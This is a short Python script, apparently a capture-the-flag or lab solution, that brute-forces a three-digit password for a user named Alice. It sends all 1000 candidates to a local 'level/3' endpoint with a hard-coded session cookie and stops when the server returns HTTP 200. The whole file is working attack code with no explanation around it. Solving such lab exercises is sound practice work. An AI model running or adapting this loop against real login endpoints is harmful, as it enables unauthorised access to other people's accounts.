import requests

session_cookie = ".eJw9yk0KgCAQQOG7zNqFTo1UV4mQyBEE-1VbFN0927R937thWuctcGJrAp8cInS9FErgIGDP_jK_F_hiTNnykowvAVBJlKgQBOTIh4n8faCpoQrJuppIu3aE5wUhXSCi.aioPHg.TBUspq-UjikqJE1Wq16jV7YZPvg"

cookies = {
	"session": session_cookie
}

for i in range(1000):

	#Alice password is 3 digits long so pad with 0s at front
	password = f"{i:03d}"
	
	response = requests.get(
		"http://localhost:8000/level/3",
		params={"password": password},
		cookies=cookies
	)

	print(password, response.status_code)
	if response.status_code == 200:
		print("Password found:", password)
		break

